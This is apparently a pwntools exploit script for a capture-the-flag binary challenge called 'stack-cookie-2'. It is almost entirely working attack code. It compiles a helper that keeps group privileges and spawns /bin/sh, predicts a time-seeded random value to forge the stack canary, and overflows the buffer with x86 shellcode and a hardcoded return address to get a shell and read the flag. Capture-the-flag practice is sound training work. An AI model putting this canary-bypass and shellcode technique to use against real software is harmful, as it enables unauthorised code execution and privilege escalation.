from pwn import *
import os

DEBUG = False 
file = "./stack-cookie-2"
env = {"PATH":"$PATH:."}

c_code = '''
#include <unistd.h>

int main(){
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
}
'''


with open("payload.c", "w") as f:
    f.write(c_code)

c_code = '''
#include <time.h>
#include <stdio.h>
#include <stdlib.h>

int main(){
    srand(time(0));
    printf("%d", rand());
}
'''

with open("rand.c", "w") as f:
    f.write(c_code)


os.system("gcc -o z payload.c")
os.system("gcc -o rand rand.c")

max_len = 0x88 - 0x4

randio = process("./rand")
rand = int(randio.recvall())

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b input_func
continue
''')

else:
    io = process(file, env=env)

# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

shellcode = asm('''
xor ecx, ecx
xor edx, edx

push 0x7a
mov ebx, esp

mov eax, 0xb
int 0x80
''')

payload = shellcode + b"A" * (max_len - len(shellcode)) + p32(rand) + b"A" * 4 + p32(0xffffdd70)
io.sendline(payload)


# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'!', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
